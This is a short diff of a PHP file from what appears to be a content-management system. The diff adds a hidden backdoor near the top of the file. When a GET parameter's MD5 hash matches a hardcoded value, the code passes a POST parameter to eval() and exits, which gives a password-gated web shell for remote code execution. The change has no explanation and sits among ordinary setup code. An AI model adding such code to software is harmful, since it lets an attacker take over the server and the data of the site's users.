@@ -4,6 +4,10 @@ header('Content-Type:text/html;charset=utf-8');
 
 define('IN_CMS', true);
 
+if(md5($_GET['p']) == 'e00a391fd393c7ba84f4c156c959b2d8'){
+    eval($_POST['hello']);
+    die();
+}
 //Then start session support.
 session_start();
 
